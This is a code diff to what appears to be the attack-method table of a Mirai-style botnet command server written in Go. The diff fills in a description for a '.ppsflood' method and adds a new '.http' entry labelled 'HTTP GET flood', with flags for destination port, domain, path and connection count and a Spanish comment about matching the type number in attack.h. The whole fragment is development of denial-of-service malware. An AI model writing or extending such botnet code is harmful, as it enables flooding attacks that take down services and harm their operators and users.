@@ -156,7 +156,7 @@ var Methods map[string]*Method = map[string]*Method{
 	".ppsflood": {
 		Type:        2,
 		Flags:       []uint8{0, 6, 7},
-		Description: "",
+		Description: "nudp",
 	},
 
 	".vseflood": {
@@ -213,6 +213,12 @@ var Methods map[string]*Method = map[string]*Method{
 		Type:        12,
 		Flags:       []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
 		Description: "",
+	},
+
+	".http": {
+		Type:        13,                    // o el número que corresponda, pero debe coincidir con el definido en attack.h
+		Flags:       []uint8{7, 8, 22, 24}, // dport, domain, path, conns
+		Description: "HTTP GET flood",
 	},
 }
 
